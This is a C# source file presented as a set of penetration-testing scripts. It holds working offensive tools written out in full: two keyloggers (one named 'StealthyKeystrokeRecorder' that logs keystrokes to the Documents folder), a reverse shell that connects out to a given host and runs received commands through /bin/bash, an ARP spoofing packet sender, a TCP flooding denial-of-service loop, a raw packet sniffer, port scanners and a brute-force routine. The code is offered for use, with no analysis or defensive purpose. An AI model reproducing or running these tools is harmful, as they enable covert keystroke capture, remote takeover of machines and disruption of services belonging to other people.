using System.Net.Sockets;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Linq;
using System.Net;
using System.Diagnostics;
using System.Net.NetworkInformation;
using PacketDotNet;
using SharpPcap;
using OpenQA.Selenium;
using HtmlAgilityPack;

namespace PenetrationTestingTools.Scripts;

#region   Port Scanner  
public class PortScanner
{
    public static async Task ScanAll(string host, int startPort, int endPort)
    {



        var tasks = new List<Task>();

        for (int port = startPort; port <= endPort; port++)
        {
            int p = port;
            tasks.Add(Task.Run(() => ScanPort(host, p)));
        }

        await Task.WhenAll(tasks);
    }

    private static async Task ScanPort(string host, int port)
    {
        using var client = new TcpClient();
        try
        {
            await client.ConnectAsync(host, port);
            Console.WriteLine($"Port {port} is open.");
        }
        catch
        {
            Console.WriteLine($"Port {port} is closed.");
        }
    }
}
#endregion

#region   KeyLogger 
public class KeyLogger
{
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern short GetAsyncKeyState(int vKey);

    public static void KeyLoggerRun()
    {
        Console.WriteLine("Keylogger started. Press Ctrl + C to exit.");

        while (true)
        {
            Thread.Sleep(10);
            for (int i = 0; i < 255; i++)
            {
                short keyState = GetAsyncKeyState(i);
                if ((keyState & 0x8000) != 0)
                {
                    LogKeyStroke(i);
                }
            }
        }
    }

    private static void LogKeyStroke(int keyCode)
    {
        string logFilePath = AppDomain.CurrentDomain.BaseDirectory + @"\log.txt";
        string keyRepresentation = ConvertKeyCodeToString(keyCode);
        string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff");

        using (StreamWriter sw = new StreamWriter(logFilePath, true))
        {
            sw.WriteLine($"{timestamp} - {keyRepresentation}");
        }
    }

    private static string ConvertKeyCodeToString(int keyCode)
    {
        string keyRepresentation;
        switch (keyCode)
        {
            case 13:
                keyRepresentation = "Enter";
                break;
            case 16:
            case 160:
            case 161:
                keyRepresentation = "Shift";
                break;
            case 17:
            case 162:
            case 163:
                keyRepresentation = "Control";
                break;
            case 18:
            case 164:
            case 165:
                keyRepresentation = "Alt";
                break;
            case 20:
                keyRepresentation = "CapsLock";
                break;
            case 27:
                keyRepresentation = "Escape";
                break;
            case 32:
                keyRepresentation = "Space";
                break;
            case 46:
                keyRepresentation = "Delete";
                break;
            default:
                keyRepresentation = ((char)keyCode).ToString();
                break;
        }

        return keyRepresentation;
    }
}

#endregion

#region  Packet Sniffer 

public class PacketSniffer
{
    public static void PacketSnifferRun(string host)
    {
        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, System.Net.Sockets.ProtocolType.IP);

        IPAddress localhost = IPAddress.Parse(host);
        EndPoint endPoint = new IPEndPoint(localhost, 0);

        socket.Bind(endPoint);

        socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);

        byte[] inValue = new byte[] { 1, 0, 0, 0 };
        byte[] outValue = new byte[] { 0, 0, 0, 0 };
        socket.IOControl(IOControlCode.ReceiveAll, inValue, outValue);

        byte[] buffer = new byte[4096];

        while (true)
        {
            int bytesReceived = socket.Receive(buffer);

            IPAddress sourceIP = new IPAddress(buffer.Skip(12).Take(4).ToArray());
            IPAddress destinationIP = new IPAddress(buffer.Skip(16).Take(4).ToArray());

            int protocolTypePosition = 23;
            int protocolType = buffer[protocolTypePosition];

            string protocol;

            switch (protocolType)
            {
                case 6:
                    protocol = "TCP";
                    break;
                case 17:
                    protocol = "UDP";
                    break;
                case 1:
                    protocol = "ICMP";
                    break;
                default:
                    protocol = "Unknown";
                    break;
            }

            Console.WriteLine($"Source IP: {sourceIP}, Destination IP: {destinationIP}, Protocol: {protocol}");
        }
    }
}
#endregion

#region  Vulnerability Scanner
public class VulnerabilityScanner
{
    public static async Task ScanAll(string targetIP)
    {



        var tasks = new Task[1024];
        for (int port = 1; port <= 1024; port++)
        {
            int localPort = port;
            tasks[port - 1] = Task.Run(() => ScanPortAsync(targetIP, localPort));
        }

        await Task.WhenAll(tasks);
    }

    private static async Task ScanPortAsync(string host, int port)
    {
        using (TcpClient client = new TcpClient())
        {
            try
            {
                await client.ConnectAsync(host, port);
                Console.WriteLine($"Port {port} is open!");
            }
            catch (Exception ex) when (ex is SocketException || ex is ObjectDisposedException)
            {
                // Ignore expected exceptions when connection can't be made
            }
        }
    }
}

#endregion

#region ReverseShell
class ReverseShell
{
    public static void RunAll(string host, int port)
    {
        while (true)
        {
            try
            {
                using (TcpClient client = new TcpClient(host, port))
                {
                    using (Stream stream = client.GetStream())
                    using (StreamReader reader = new StreamReader(stream))
                    using (StreamWriter writer = new StreamWriter(stream))
                    {
                        while (true)
                        {
                            writer.Write("$ ");
                            writer.Flush();
                            string cmd = reader.ReadLine();

                            if (string.IsNullOrEmpty(cmd))
                            {
                                client.Close();
                                return;
                            }
                            else
                            {
                                // Run the command
                                var cmdProcess = new Process
                                {
                                    StartInfo = new ProcessStartInfo
                                    {
                                        FileName = "/bin/bash",
                                        Arguments = "-c \"" + cmd + "\"",
                                        UseShellExecute = false,
                                        RedirectStandardOutput = true
                                    }
                                };

                                cmdProcess.Start();

                                writer.Write(cmdProcess.StandardOutput.ReadToEnd());
                                writer.Flush();
                            }
                        }
                    }
                }
            }
            catch (Exception ex) when (ex is SocketException || ex is IOException)
            {
                // If a network error occurs, wait for a moment then attempt to reconnect
                Thread.Sleep(5000);
            }
        }
    }
}
#endregion

#region Spoofing Attack

public class SpoofingAttack
{
    public static void RunAll(string deviceName, string targetIP, string spoofIP)
    {

        var devices = CaptureDeviceList.Instance.Where(x => x.Description == deviceName).First();

        foreach (var dev in CaptureDeviceList.Instance)
        {
            Console.WriteLine("MacAddress:" + dev.MacAddress + " | Description:" + dev.Description);

        }

        var device = CaptureDeviceList.Instance[devices.Name];
        device.Open(DeviceModes.Promiscuous);

        var ethernetPacket = new EthernetPacket(device.MacAddress,
        PhysicalAddress.Parse("00-00-00-00-00-00"),
        EthernetType.Arp);

        var arpPacket = new ArpPacket(ArpOperation.Request,
        PhysicalAddress.Parse("00-00-00-00-00-00"),
        IPAddress.Parse(spoofIP),
        device.MacAddress,
        IPAddress.Parse(targetIP));

        ethernetPacket.PayloadPacket = arpPacket;

        device.SendPacket(ethernetPacket);

        device.Close();
    }
}
#endregion

#region BruteForce

public class BruteForce
{
    static string alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    public static void RunAll(string passwordToCrack, int maxPasswordLength)
    {



        foreach (var attempt in GeneratePasswords(maxPasswordLength))
        {
            if (attempt == passwordToCrack)
            {
                Console.WriteLine($"Password cracked! It is {attempt}.");
                break;
            }
        }
    }

    static IEnumerable<string> GeneratePasswords(int maxLength)
    {
        for (int length = 1; length <= maxLength; length++)
        {
            foreach (string password in GeneratePasswordsOfLength("", length))
            {
                yield return password;
            }
        }
    }

    static IEnumerable<string> GeneratePasswordsOfLength(string prefix, int length)
    {
        if (length == 0)
        {
            yield return prefix;
        }
        else
        {
            foreach (char c in alphabet)
            {
                foreach (string password in GeneratePasswordsOfLength(prefix + c, length - 1))
                {
                    yield return password;
                }
            }
        }
    }
}

#endregion

#region DoSAttack

public class AdvancedDoSAttack
{

    private static readonly byte[] buffer = new byte[1024];

    public static void RunAll()
    {
        Console.Write("Enter target IP: ");
        string targetIP2 = Console.ReadLine();
        Console.Write("Port: ");
        int port = Convert.ToInt32(Console.ReadLine());
        while (true)
        {
            try
            {
                using (TcpClient client = new TcpClient(targetIP2, port))
                {
                    NetworkStream stream = client.GetStream();
                    while (true)
                    {
                        stream.Write(buffer, 0, buffer.Length);
                    }
                }
            }
            catch (Exception)
            {
                Console.WriteLine("Connection unsuccessful. Retrying...");
            }
        }
    }
}



#endregion

#region SocialToolKit

public class StealthyKeystrokeRecorder
{
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);

    public static void RunAll()
    {
        string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\log.txt";

        while (true)
        {
            for (int i = 0; i < 255; i++)
            {
                int keyState = GetAsyncKeyState(i);
                if (keyState == 1 || keyState == -32767)  // Check for keypress
                {
                    if (i >= 32 && i <= 126)  // Printable ASCII characters
                    {
                        char character = Convert.ToChar(i);
                        File.AppendAllText(path, character.ToString());
                    }
                    else
                    {
                        File.AppendAllText(path, $"Key with ASCII code {i} was pressed.");
                    }
                }
            }
        }
    }
}




#endregion

#region Web Scraper
class Webscraper
{
    public static void RunAll(string url)
    {
        var web = new HtmlWeb();
        var document = web.Load(url);
        var nodes = document.DocumentNode.SelectNodes("//img");

        WebClient client = new WebClient();

        int i = 1;
        foreach (var node in nodes)
        {
            string imageURL = node.GetAttributeValue("src", null);

            if (imageURL != null)
            {
                Console.WriteLine($"Downloading image: {imageURL}");
                client.DownloadFile(imageURL, $"Image{i}.jpg");
                i++;
            }
        }
    }
}


#endregion